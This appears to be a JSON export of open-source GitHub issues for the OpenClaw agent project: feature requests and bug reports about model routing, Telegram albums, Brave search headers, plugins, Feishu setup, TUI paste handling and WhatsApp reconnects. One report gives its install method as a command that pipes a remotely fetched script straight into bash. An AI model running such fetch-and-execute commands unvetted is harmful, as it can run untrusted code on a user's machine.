Extraction (Routing)**\n*   **User Task:** \"Extract the date and total amount from this receipt text as JSON.\"\n*   **Without Wrangle:** Uses GPT-4o (Configured Default). Cost: ~$0.01/req.\n*   **With Wrangle:** Router detects \"Low Intensity\" (formatting). Routes to **Gemini 1.5 Flash**. Cost: ~$0.0001/req. **(99% Savings)**.\n\n**Scenario 3: Complex Coding (Routing)**\n*   **User Task:** \"Refactor this Python class to use the Factory pattern.\"\n*   **With Wrangle:** Router detects \"High Intensity\" (coding logic). Routes to **Claude 3.5 Sonnet** for maximum capability.\n\n### Implementation Plan\nSince WrangleAI adheres to the OpenAI API signature, the integration is strictly a configuration change within OpenClaw's existing architecture.\n\n1.  **Register Provider:** Update `src/agents/model-selection.ts` to recognize `wrangle` as a valid provider ID.\n2.  **Client Initialization:** In the LLM factory, instantiate an `OpenAI` client pointing to `https://gateway.wrangleai.com/v1` using `WRANGLE_API_KEY`.\n3.  **Config:** Map Wrangle-specific headers (like `slm`) to the agent's config options.\n\n**I am ready to implement and submit a PR for this provider.** This addition would make OpenClaw immediately viable for environments requiring DLP and compliance controls as well as everyday users wanting to save some money.\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14030",
      "createdAt": "2026-02-11T10:30:13Z",
      "updatedAt": "2026-02-11T10:30:13Z",
      "author": "Rafay-15",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": [
          "gateway",
          "web-ui",
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 14027,
      "title": "Feature: Outbound Telegram media group (album) support via sendMediaGroup",
      "body": "## Problem\n\nWhen an agent generates multiple images in a single response (e.g., via image generation tools, or when the `message` tool is called with multiple media), Telegram displays them as separate messages instead of a grouped album. This is because OpenClaw's Telegram plugin sends each image individually via `api.sendPhoto()` rather than using Telegram Bot API's `sendMediaGroup()`.\n\n### Current Behavior\n- Agent response contains multiple `MEDIA:` lines → each sent as a separate `sendPhoto` call\n- `message` tool's `media` parameter only accepts a single URL/path\n- Result: N separate messages instead of 1 album message\n- User experience is cluttered, especially for image-heavy responses (e.g., \"generate 4 variations\")\n\n### Expected Behavior\n- Multiple images in a single response should be grouped as a Telegram album via `sendMediaGroup`\n- The `message` tool should support sending multiple media items as an album\n\n## Technical Analysis\n\n### Telegram Bot API Reference\n[`sendMediaGroup`](https://core.telegram.org/bots/api#sendmediagroup) supports:\n- 2-10 media items per album (photos, videos, documents, or audio)\n- Each item is an [`InputMediaPhoto`](https://core.telegram.org/bots/api#inputmediaphoto) / [`InputMediaVideo`](https://core.telegram.org/bots/api#inputmediavideo) object\n- Only the first item's `caption` is displayed (shared caption for the album)\n- Returns an array of `Message` objects\n- Supports `reply_parameters`, `disable_notification`, `protect_content`, `message_thread_id`\n\n### Current OpenClaw Implementation\nIn `reply-DptDUVRg.js`, outbound media is always sent one-at-a-time:\n```js\n// Line ~17054: always sendPhoto for images\nelse if (kind === \"image\") result = await sendWithThreadFallback(\n  mediaParams, \"photo\",\n  async (effectiveParams, label) => api.sendPhoto(chatId, file, effectiveParams)\n);\n```\n\nNote: OpenClaw **already handles inbound media groups** correctly — there's a `mediaGroupBuffer` (line ~35717) that aggregates incoming album messages by `media_group_id` before processing. The gap is only on the **outbound** side.\n\n### grammY (Telegram framework used by OpenClaw) Support\ngrammY already exposes `api.sendMediaGroup()` via its `Api` class — no additional dependencies needed:\n```js\nawait api.sendMediaGroup(chatId, [\n  { type: \"photo\", media: file1, caption: \"Album caption\" },\n  { type: \"photo\", media: file2 },\n]);\n```\n\n## Proposed Solution\n\n### 1. Reply pipeline: batch consecutive `MEDIA:` image blocks\nWhen the reply pipeline encounters multiple consecutive image blocks in a single assistant response, batch them into a single `sendMediaGroup` call instead of individual `sendPhoto` calls.\n\n**Pseudocode:**\n```js\n// In the reply chunking/sending logic:\nconst pendingImages = [];\nfor (const block of responseBlocks) {\n  if (block.kind === \"image\") {\n    pendingImages.push(block);\n    continue;\n  }\n  if (pendingImages.length >= 2) {\n    await flushMediaGroup(pendingImages); // sendMediaGroup\n  } else if (pendingImages.length === 1) {\n    await sendSinglePhoto(pendingImages[0]); // existing sendPhoto\n  }\n  pendingImages.length = 0;\n  await sendBlock(block); // text, audio, etc.\n}\n// flush remaining\nif (pendingImages.length >= 2) await flushMediaGroup(pendingImages);\nelse if (pendingImages.length === 1) await sendSinglePhoto(pendingImages[0]);\n```\n\n### 2. `message` tool: add `mediaUrls` array parameter\nAllow the `message` tool to accept multiple media items:\n```\nmessage action=send to=<target> mediaUrls=[\"url1\",\"url2\",\"url3\"] caption=\"Album caption\"\n```\n\nConstraints:\n- Max 10 items (Telegram limit)\n- All items must be the same general type (photos together, videos together, documents together)\n- Caption applies to the first item only (Telegram behavior)\n\n### 3. Edge cases to handle\n- **Mixed media types:** photos + videos can be grouped; documents/audio must be separate groups\n- **Single image fallback:** if only 1 image, use existing `sendPhoto` path\n- **Caption handling:** only first `InputMedia` item gets the caption; subsequent items should have empty caption\n- **Error handling:** if `sendMediaGroup` fails, fall back to individual sends\n- **Thread/topic support:** pass `message_thread_id` to `sendMediaGroup` (supported since Bot API 9.3)\n- **`reply_parameters`:** `sendMediaGroup` supports replying, should be preserved\n\n## Related\n\n- #13620 — Similar feature request (simpler scope)\n- #1811 — Inbound media group timeout issue (closed)\n\n## Environment\n- OpenClaw v2026.2.9\n- Telegram Bot API 9.4\n- grammY (bundled in OpenClaw) already supports `sendMediaGroup`",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14027",
      "createdAt": "2026-02-11T10:26:09Z",
      "updatedAt": "2026-02-11T10:26:09Z",
      "author": "smysle",
      "labels": [],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [],
        "components": []
      }
    },
    {
      "number": 2476,
      "title": "[Bug]: web_search: Brave API returns 422 due to missing Cache-Control header",
      "body": "## Description\n\nThe `web_search` tool fails with Brave Search API returning a 422 error when `Cache-Control: no-cache` header is not explicitly set.\n\n## Error\nBrave Search API error (422): {\n\"error\": {\n\"code\": \"VALIDATION\",\n\"detail\": \"Unable to validate request parameter(s)\",\n\"meta\": {\n\"errors\": [{\n\"loc\": [\"header\", \"cache-control\"],\n\"msg\": \"Input should be 'no-cache'\",\n\"input\": \"max-stale=0\"\n}]\n}\n}\n}\n\n## Root Cause\n\nIn `src/agents/tools/web-search.ts` (line ~374-380), the fetch request to Brave API does not include the `Cache-Control: no-cache` header:\n\n```typescript\nconst res = await fetch(url.toString(), {\n  method: \"GET\",\n  headers: {\n    Accept: \"application/json\",\n    \"X-Subscription-Token\": params.apiKey,\n    // Missing: \"Cache-Control\": \"no-cache\"\n  },\n  signal: withTimeout(undefined, params.timeoutSeconds * 1000),\n});\nIn some environments (possibly due to system-level HTTP proxies or caching tools), a different Cache-Control value (e.g., max-stale=0) may be automatically added, causing Brave API to reject the request.\n\nSuggested Fix\nAdd the Cache-Control: no-cache header explicitly:\n\nheaders: {\n  Accept: \"application/json\",\n  \"X-Subscription-Token\": params.apiKey,\n  \"Cache-Control\": \"no-cache\",\n},\nEnvironment\nClawdbot version: 2026.1.24-3\nNode.js: v25.2.1\nOS: macOS (Darwin 25.2.0 arm64)\nWorkaround\nUsing curl directly with explicit Cache-Control: no-cache header works:\n\ncurl -s \"https://api.search.brave.com/res/v1/web/search?q=test&count=5\" \\\n  -H \"Accept: application/json\" \\\n  -H \"Cache-Control: no-cache\" \\\n  -H \"X-Subscription-Token: $BRAVE_API_KEY\"\n\n---",
      "state": "closed",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/2476",
      "createdAt": "2026-01-27T00:53:59Z",
      "updatedAt": "2026-02-11T10:23:35Z",
      "author": "ch-en-hyphen",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "signal"
        ],
        "platforms": [
          "macos",
          "linux"
        ],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3830057748,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/2476#issuecomment-3830057748",
          "createdAt": "2026-02-01T01:52:55Z",
          "updatedAt": "2026-02-01T01:52:55Z",
          "author": "sebslight",
          "body": "Hello from the triage desert — it’s 30+ issues/hour and shade is scarce. We’re closing issues that haven’t seen any updates in the last 4 days. If this is still happening and it’s a real bug, please open a new issue and we’ll re-evaluate. Thanks for understanding."
        },
        {
          "id": 3883526622,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/2476#issuecomment-3883526622",
          "createdAt": "2026-02-11T10:23:35Z",
          "updatedAt": "2026-02-11T10:23:35Z",
          "author": "wangbogong",
          "body": "+1 我在最新版本中仍然遇到类似问题。\n\n环境：\n- OpenClaw 版本: 2026.2.6-3（已更新到最新版）\n- Node.js: v22.16.0\n- OS: macOS Darwin 25.2.0 (arm64)\n\n现象：\n- web_search 工具返回 \"fetch failed\" 错误\n- 但直接用 Python 调用 Brave API 是正常的 (HTTP 200)\n- API Key 已确认配置正确\n- 错误日志显示: [tools] web_search failed: fetch failed\n\n目前的临时解决方案是用 Python 脚本直接调用 API。\n\n请问这个修复是否已经包含在最新版本中？如果不是，什么时候会发布？"
        }
      ]
    },
    {
      "number": 13913,
      "title": "[Bug]: [summary / workaround] All plugins with `dependencies` can't be installed",
      "body": "## Summary\n\nAll plugins with dependencies including:\n\n- `@openclaw/feishu`\n- `@openclaw/matrix`\n- `@openclaw/msteams`\n- `@openclaw/googlechat`\n- `@openclaw/nostr`\n- `@openclaw/zalo`\n- `@openclaw/tlon`\n\ncan't be installed. The error message is like:\n\n```\n05:45:11 [plugins] feishu failed to load from /home/ubuntu/.openclaw/extensions/feishu/index.ts: Error: Cannot find module '@sinclair/typebox'\nRequire stack:\n- /home/ubuntu/.openclaw/extensions/feishu/src/bitable.ts\n05:45:11 [plugins] matrix failed to load from /home/ubuntu/.openclaw/extensions/matrix/index.ts: Error: Cannot find module '@vector-im/matrix-bot-sdk'\nRequire stack:\n- /home/ubuntu/.openclaw/extensions/matrix/src/matrix/client/config.ts\n```\n\nPrior reports: #1839 #5292 #5780 #6879 #6989 #8145 #8492 #8576 #8670 #7879 #9357 #9702 #10941 #11245 #12067 #12853 #13409 #13448 AlexAnys/openclaw-feishu#18 AlexAnys/openclaw-feishu#20\n\n## However it's not a bug\n\n`@openclaw/*` plugins have been bundled into the core package. You don't need to install them again. Just skip installation step.\n\nI'm posting here oo help those who come after find the correct information, please don't close.",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13913",
      "createdAt": "2026-02-11T06:33:52Z",
      "updatedAt": "2026-02-11T10:20:01Z",
      "author": "typed-sigterm",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "googlechat"
        ],
        "platforms": [
          "linux"
        ],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3883510183,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13913#issuecomment-3883510183",
          "createdAt": "2026-02-11T10:20:01Z",
          "updatedAt": "2026-02-11T10:20:01Z",
          "author": "vincentkoc",
          "body": "this solves it https://github.com/openclaw/openclaw/pull/12849"
        }
      ]
    },
    {
      "number": 13812,
      "title": "[Bug]: v2026.2.9 cron announce → Telegram topic sends summary instead of full output",
      "body": "After upgrading to OpenClaw v2026.2.9, a cron job configured with delivery.mode=\"announce\" to a Telegram forum topic started delivering only an announcement/summary (not the full report output) and also produced extra relay/noise to the main DM session. \n\nDowngrading to v2026.2.6 restores correct behavior.\n\nSteps to reproduce\n\n1. Upgrade OpenClaw to v2026.2.9.\n2. Create/run an isolated cron job that generates a multi-line report (e.g. a daily report script) with:  • sessionTarget: isolated\n  • delivery.mode: \"announce\"\n  • delivery.channel: \"telegram\"\n  • delivery.to: -1003837362423:topic:85 (Telegram forum topic)\n\n3. Trigger the cron run and observe the delivered Telegram message.\nExpected behavior\n\nTelegram topic receives the full multi-line report output (verbatim / no summarization), and only one delivery (no extra DM relay/noise).\n\nActual behavior\n\nTelegram topic receives only a short announcement/summary (e.g. “report generated…” with brief explanation) instead of the full report, and an additional relay/noise appears in the main DM session.\n\nEnvironment\n\n• OpenClaw version: v2026.2.9 (problem) / v2026.2.6 (works)\n• OS: Linux (VPS)\n• Install method (pnpm/npx/docker/etc): installer script (curl -fsSL https://openclaw.ai/install.sh | bash) → ends up as npm global install",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13812",
      "createdAt": "2026-02-11T02:25:48Z",
      "updatedAt": "2026-02-11T10:19:18Z",
      "author": "nusquama",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [
          "linux",
          "docker"
        ],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3883506636,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13812#issuecomment-3883506636",
          "createdAt": "2026-02-11T10:19:18Z",
          "updatedAt": "2026-02-11T10:19:18Z",
          "author": "0xTimepunk",
          "body": "@steipete "
        }
      ]
    },
    {
      "number": 8798,
      "title": "[Bug]: 飞书事件与回调那里无法保存长链接",
      "body": "在飞书的公开平台配置bot的时候，在飞书事件与回调那里，订阅方式：使用 长连接 接收事件，一直无法保存。\nTitle: Feishu Long Connection Event Subscription Verification Fails\nKey Points:\nOpenClaw v2026.2.2-3 on WSL2 with Node.js v22.22.0\nGateway logs show [feishu] WebSocket client connected ✓\nBut Feishu developer console save for long connection mode never completes\nSubscription method remains \"未配置\" (Not configured)\nPermissions and Bot capability are properly configured\nHTTP callback mode also unavailable (webhook endpoint returns 405)\nRoot Cause Hypothesis:\nSDK event handlers may not be registered correctly for platform verification\nPossible difference in how EventDispatcher is initialized\n\n<img width=\"2361\" height=\"1445\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/652104f5-5749-414a-b759-71687f76a279\" />",
      "state": "open",
      "comments": 6,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/8798",
      "createdAt": "2026-02-04T12:03:42Z",
      "updatedAt": "2026-02-11T10:17:17Z",
      "author": "zixindh",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "windows"
        ],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3847088618,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/8798#issuecomment-3847088618",
          "createdAt": "2026-02-04T12:12:25Z",
          "updatedAt": "2026-02-04T12:12:25Z",
          "author": "Hurray0",
          "body": "要先配置openclaw连接，才能启用"
        },
        {
          "id": 3847096384,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/8798#issuecomment-3847096384",
          "createdAt": "2026-02-04T12:14:10Z",
          "updatedAt": "2026-02-04T12:16:34Z",
          "author": "ailot",
          "body": "[看看这个了](https://mp.weixin.qq.com/s/_Oby5kHbI37CSkcC3Atb5Q)\n\n![](http://cdn.ailot.vip/doc/img20260203185623736.png)"
        },
        {
          "id": 3847174898,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/8798#issuecomment-3847174898",
          "createdAt": "2026-02-04T12:32:15Z",
          "updatedAt": "2026-02-04T12:32:15Z",
          "author": "zixindh",
          "body": "> 要先配置openclaw连接，才能启用\n\n请问这个是在哪里配置？\n\n我是用Windows里面的wsl里建立的openclaw。\n\nOpenClaw v2026.2.2-3 on WSL2 with Node.js v22.22.0\nGateway logs show [feishu] WebSocket client connected ✓\nBut Feishu developer console save for long connection mode never completes\nSubscription method remains \"未配置\" (Not configured)\nPermissions and Bot capability are properly configured\nHTTP callback mode also unavailable (webhook endpoint returns 405)\nRoot Cause Hypothesis:\nSDK event handlers may not be registered correctly for platform verification\nPossible difference in how EventDispatcher is initialized"
        },
        {
          "id": 3847355824,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/8798#issuecomment-3847355824",
          "createdAt": "2026-02-04T13:07:02Z",
          "updatedAt": "2026-02-04T13:07:02Z",
          "author": "Hurray0",
          "body": "> > 要先配置openclaw连接，才能启用\n> \n> 请问这个是在哪里配置？\n> \n> 我是用Windows里面的wsl里建立的openclaw。\n> \n> OpenClaw v2026.2.2-3 on WSL2 with Node.js v22.22.0\n> Gateway logs show [feishu] WebSocket client connected ✓\n> But Feishu developer console save for long connection mode never completes\n> Subscription method remains \"未配置\" (Not configured)\n> Permissions and Bot capability are properly configured\n> HTTP callback mode also unavailable (webhook endpoint returns 405)\n> Root Cause Hypothesis:\n> SDK event handlers may not be registered correctly for platform verification\n> Possible difference in how EventDispatcher is initialized\n\n就是说你要把飞书的channel填好，重启openclaw连上去，飞书那边才可以保存"
        },
        {
          "id": 3848650043,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/8798#issuecomment-3848650043",
          "createdAt": "2026-02-04T17:03:46Z",
          "updatedAt": "2026-02-04T17:03:46Z",
          "author": "jiulingyun",
          "body": "看一下这篇文档：https://clawd.org.cn/channels/feishu.html"
        },
        {
          "id": 3883496650,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/8798#issuecomment-3883496650",
          "createdAt": "2026-02-11T10:17:17Z",
          "updatedAt": "2026-02-11T10:17:17Z",
          "author": "LHB6540",
          "body": "我遇到了同样的问题，我的解决方法是：\n- 确保飞书插件已安装\n```\nopenclaw plugins install @openclaw/feishu\n```\n- 检查飞书插件的状态\n```\nopenclaw plugins list\n# 如果处于未启动状态，执行\nopenclaw plugins enable feishu\n```\n- 使用命令行添加飞书应用信息而不是参考文档内的配置文件示例手动修改，文档可能与实际版本的配置存在不匹配\n```\nopenclaw channels add\n```\n- 重启应用\n```\nopenclaw gateway restart\n```\n再次前往飞书控制台配置事件与回调即可。注意配置事件与回调，是机器人能够弹出对话框的前提条件：\nhttps://open.feishu.cn/document/faq/bot"
        }
      ]
    },
    {
      "number": 4986,
      "title": "Multiline paste in TUI sends each line as separate message (Windows + Git Bash)",
      "body": "## Description\n\nWhen using `openclaw tui` on Windows with Git Bash (mintty/MINGW64), pasting multiline text causes each line to be sent as a separate individual message. This is session-breaking because:\n\n1. Each line is interpreted as its own independent command/task\n2. None of the lines have context from the others\n3. The session is flooded with nonsensical messages processed individually\n4. The session is effectively ruined\n\nThe damage happens instantly — lines fire as messages in rapid burst.\n\n**Also affects voice dictation:** WisprFlow (and similar) inserts paragraph breaks between thoughts. The TUI treats each paragraph as a separate submitted message, making voice input unreliable for anything beyond single-paragraph responses.\n\n### Minimal Failing Example\n\nPasting this two-line question:\n\n```\nCapital of\nFrance is?\n```\n\n**Expected:** One message sent: `\"Capital of \\nFrance is?\"`\n**Actual:** Two separate messages sent:\n1. `\"Capital of\"` — interpreted as a standalone (nonsensical) command\n2. `\"France is?\"` — interpreted as a separate (nonsensical) command\n\nNeither message has the context of the other. The intent — a single question — is destroyed.\n\n## Expected Behavior\n\nPasting a multiline text block should be treated as a single message, matching the behavior of Claude Code's terminal and standard Git Bash input handling.\n\n## Environment\n\n- **OS:** Windows 11\n- **Terminal:** Windows Terminal → Git Bash (mintty/MINGW64)\n- **Command:** `openclaw tui`\n- **pi-tui version:** `@mariozechner/pi-tui` v0.49.3\n\n## Root Cause\n\n**Git Bash for Windows does not emit bracketed paste escape sequences** (`\\x1b[200~` / `\\x1b[201~`), even though pi-tui correctly enables bracketed paste mode via `\\x1b[?2004h`.\n\nThis was proven by hex dump analysis in [badlogic/pi-mono#767](https://github.com/badlogic/pi-mono/issues/767): Git Bash sends raw bytes with only `0d` (CR) separating lines. pi-tui's `StdinBuffer` sees CR as Enter and fires `onSubmit` for each line.\n\nThis is a Git Bash / mintty limitation on Windows, not a bug in pi-tui. The same issue affects every Node.js TUI running in Git Bash on Windows — Codex CLI, Gemini CLI, Claude Code, and OpenCode all have identical reports.\n\n## Affected Tools (Same Bug)\n\n| Tool | Issue | Upvotes |\n|------|-------|---------|\n| pi-tui | [pi-mono#767](https://github.com/badlogic/pi-mono/issues/767) | - |\n| Codex CLI | [openai/codex#2137](https://github.com/openai/codex/issues/2137) | 38 |\n| Gemini CLI | [gemini-cli#3005](https://github.com/google-gemini/gemini-cli/issues/3005) | 6 |\n| Claude Code | [claude-code#5017](https://github.com/anthropics/claude-code/issues/5017) | 11 |\n| OpenCode | [sst/opencode#3343](https://github.com/sst/opencode/issues/3343) | 3 |\n\n## Proposed Solution\n\nSince bracketed paste sequences are unavailable in Git Bash, a **timing heuristic fallback** would address this:\n\n- If multiple lines arrive within a short window (e.g., <50ms between data events), treat them as a single paste operation\n- Buffer until a quiet period (e.g., 50ms of no input), then emit the buffered content as one message\n- This is the same approach used by other tools to work around the missing bracketed paste support\n\n## Workarounds Available Today\n\n- **Alt+Enter** to insert newlines manually, then Enter to submit\n- **Ctrl+Enter** for newlines (Windows Terminal)\n- **Backslash+Enter** for newlines (pi-tui compatibility feature)\n- Pipe from file: `cat prompt.txt | openclaw tui`\n- Use **WSL** instead of Git Bash (WSL sends bracketed paste correctly)\n- Use **WezTerm** or **Ghostty** instead of Windows Terminal\n\n## Framework Root Causes\n\n- [nodejs/node#38079](https://github.com/nodejs/node/issues/38079) — No API to set `ENABLE_VIRTUAL_TERMINAL_INPUT` on Windows\n- [microsoft/terminal#12385](https://github.com/microsoft/terminal/issues/12385) — Bracketed paste sequences not sent without VT input flag\n- [microsoft/terminal#18094](https://github.com/microsoft/terminal/issues/18094) — Console filters bracketed paste when VT input disabled (Closed: Not Planned)",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/4986",
      "createdAt": "2026-01-30T22:37:03Z",
      "updatedAt": "2026-02-11T10:10:04Z",
      "author": "adamkane",
      "labels": [
        "bug",
        "tui"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "windows"
        ],
        "components": [
          "tui",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3836806105,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4986#issuecomment-3836806105",
          "createdAt": "2026-02-02T18:01:55Z",
          "updatedAt": "2026-02-02T18:01:55Z",
          "author": "gabriel1ll7",
          "body": "+1 - I preffer using TUI instead of other channels, more verbose, outputs execs "
        },
        {
          "id": 3883457173,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4986#issuecomment-3883457173",
          "createdAt": "2026-02-11T10:10:04Z",
          "updatedAt": "2026-02-11T10:10:04Z",
          "author": "hitripod",
          "body": "I’m experiencing the same issue. I really hope the TUI can be fixed soon, otherwise it’s hard to send longer inputs via Telegram as well."
        }
      ]
    },
    {
      "number": 4056,
      "title": "llm-task plugin: Cannot find module pi-embedded-runner.js",
      "body": "## Description\n\nThe `llm-task` plugin fails when trying to execute a task with the following error:\n\n```\nCannot find module '../../../agents/pi-embedded-runner.js'\nRequire stack:\n- /usr/lib/node_modules/clawdbot/extensions/llm-task/src/llm-task-tool.ts\n```\n\n## Root Cause\n\nIn `extensions/llm-task/src/llm-task-tool.ts`, the fallback import path for built installations is incorrect:\n\n```typescript\n// Line ~28 - Current (broken):\nconst mod = await import(\"../../../agents/pi-embedded-runner.js\");\n\n// Should be:\nconst mod = await import(\"../../../dist/agents/pi-embedded-runner.js\");\n```\n\nThe module exists at `/dist/agents/pi-embedded-runner.js`, not `/agents/pi-embedded-runner.js`.\n\n## Workaround\n\nCreate a symlink as a temporary fix:\n\n```bash\ncd /usr/lib/node_modules/clawdbot\nln -s dist/agents agents\n```\n\n## Environment\n\n- Clawdbot version: 2026.1.24-3\n- Installation: npm global (`/usr/lib/node_modules/clawdbot`)\n- OS: Linux (Ubuntu)\n\n## Expected Behavior\n\nThe `llm-task` plugin should correctly resolve the `pi-embedded-runner.js` module in built installations.",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/4056",
      "createdAt": "2026-01-29T16:11:04Z",
      "updatedAt": "2026-02-11T10:09:50Z",
      "author": "felipewilliam2",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": []
      },
      "commentsData": [
        {
          "id": 3868407934,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4056#issuecomment-3868407934",
          "createdAt": "2026-02-08T22:12:49Z",
          "updatedAt": "2026-02-08T22:12:49Z",
          "author": "nabbl",
          "body": "Can confirm. Getting the same error. please fix. It is annoying to add the shim everytime I update openclaw."
        },
        {
          "id": 3883455839,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4056#issuecomment-3883455839",
          "createdAt": "2026-02-11T10:09:50Z",
          "updatedAt": "2026-02-11T10:09:50Z",
          "author": "zkl2333",
          "body": "I encountered the same problem."
        }
      ]
    },
    {
      "number": 14000,
      "title": "[Bug]: WhatsApp 499 reconnect triggers false 'scheduled reminder' system message",
      "body": "## Summary\nWhatsApp heartbeat reconnect (status 499) triggers a system message saying \"A scheduled reminder has been triggered\" but with no actual reminder content - only the gateway disconnect/reconnect messages.\n\n## Environment\n- OpenClaw version: 2026.2.9\n- OS: Ubuntu Linux 6.8.0-71-generic (x64)\n- Node: 22.22.0\n- Channel: WhatsApp\n\n## Steps to Reproduce\n1. Have WhatsApp channel connected\n2. Wait for 30 minutes of idle (no messages)\n3. WhatsApp heartbeat triggers automatic reconnect (status 499)\n4. System injects message to agent session:\n```\nSystem: [timestamp] WhatsApp gateway disconnected (status 499)\nSystem: [timestamp] WhatsApp gateway connected.\n\nA scheduled reminder has been triggered. The reminder message is shown in the system messages above. Please relay this reminder to the user in a helpful and friendly way.\n```\n\n## Expected Behavior\n- WhatsApp heartbeat reconnect (499) should NOT trigger a \"scheduled reminder\" message\n- OR the reminder system should only fire when there's actual reminder content\n\n## Actual Behavior\n- Every 499 reconnect triggers the reminder prompt\n- Agent receives instruction to \"relay reminder\" but there's no reminder content\n- Agent has to explain to user that there's no actual reminder\n\n## Logs\nFrom `/tmp/openclaw/openclaw-2026-02-11.log`:\n```\n{\"subsystem\":\"gateway/channels/whatsapp/heartbeat\"} \"No messages received in 30m - restarting connection\"\n{\"module\":\"web-reconnect\"} {\"status\":499,\"reconnectAttempts\":1} \"web reconnect: scheduling retry\"\n{\"subsystem\":\"gateway/channels/whatsapp\"} \"WhatsApp Web connection closed (status 499). Retry 1/12...\"\n{\"subsystem\":\"gateway/channels/whatsapp\"} \"Listening for personal WhatsApp inbound messages.\"\n```\n\n## Additional Context\n- The 499 reconnects are intentional (heartbeat after 30m idle) - this is fine\n- The issue is that it incorrectly triggers the reminder relay prompt\n- This happens multiple times per day during idle periods",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14000",
      "createdAt": "2026-02-11T09:20:10Z",
      "updatedAt": "2026-02-11T09:51:14Z",
      "author": "khaeransori",
      "labels": [],
      "taxonomy": {
        "channels": [
          "whatsapp"
        ],
        "platforms": [
          "linux"
        ],
        "components": [
          "gateway"
        ]
      },
      "commentsData": [
        {
          "id": 3883364998,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/14000#issuecomment-3883364998",
          "createdAt": "2026-02-11T09:51:14Z",
          "updatedAt": "2026-02-11T09:51:14Z",
          "author": "0xRaini",
          "body": "This is a fun one. The 499 reconnect is being misinterpreted as a cron/reminder event somewhere in the pipeline.\n\nMy guess is the reconnect injects system messages into the session, and then the heartbeat or wake handler sees system messages and assumes it's a triggered reminder. The `\"A scheduled reminder has been triggered\"` text looks like it comes from the cron announce template being applied to the wrong event.\n\n**Quick fix idea:** The reminder detection should check whether the system messages actually contain reminder content before injecting the relay prompt. Something like:\n\n```ts\n// Only inject reminder relay prompt if there's actual reminder content\n// (not just gateway connect/disconnect noise)\nconst hasReminderContent = systemMessages.some(m => \n  !m.includes('gateway disconnected') && \n  !m.includes('gateway connected')\n);\nif (!hasReminderContent) return; // skip relay prompt\n```\n\nOr better yet, tag cron-originated system events with a `source: \"cron\"` field so the handler can distinguish them from infrastructure events.\n\nAre you seeing this on every reconnect, or only occasionally?"
        }
      ]
    },
    {
      "number": 14015,
      "title": "Telegram: reset/new commands lose topic context, replies go to General",
      "body": "## Bug Description\n\nWhen using `reset` or `new` commands in a Telegram **group topic**, the response is sent to the **General** channel instead of staying in the topic where the command was issued.\n\n## Steps to Reproduce\n\n1. Have a Telegram group with topics enabled\n2. Go to a specific topic (e.g., `topic:10`)\n3. Send `reset` or `new` command\n4. Observe that the response/welcome message appears in **General** instead of the topic\n\n## Expected Behavior\n\nThe response should stay in the same topic where the command was issued.\n\n## Actual Behavior\n\n- `reset` → response goes to General\n- `new` → welcome message goes to General\n\n## Root Cause (suspected)\n\nThe session reset/creation logic clears or fails to preserve the `deliveryContext`, specifically the `topicId`. When the session state is cleared, the bot loses track of which topic it should reply to and defaults to the main group (General = no topicId).\n\n## Suggested Fix\n\nThe session creation/reset logic should:\n1. Capture the incoming message's `topicId` **before** reset/new\n2. Preserve or re-apply it to the new session's `deliveryContext`\n3. Reply to the **same topic** the command came from\n\n## Environment\n\n- Telegram group with topics enabled\n- OpenClaw with Telegram channel integration\n\n## Workaround\n\nCreate a new topic manually in Telegram instead of using `reset`/`new` commands.\n\n---\n\n🦞 Filed via OpenClaw agent",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14015",
      "createdAt": "2026-02-11T09:42:30Z",
      "updatedAt": "2026-02-11T09:51:02Z",
      "author": "bencassistant-ship-it",
      "labels": [],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [],
        "components": []
      },
      "commentsData": [
        {
          "id": 3883363868,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/14015#issuecomment-3883363868",
          "createdAt": "2026-02-11T09:51:01Z",
          "updatedAt": "2026-02-11T09:51:01Z",
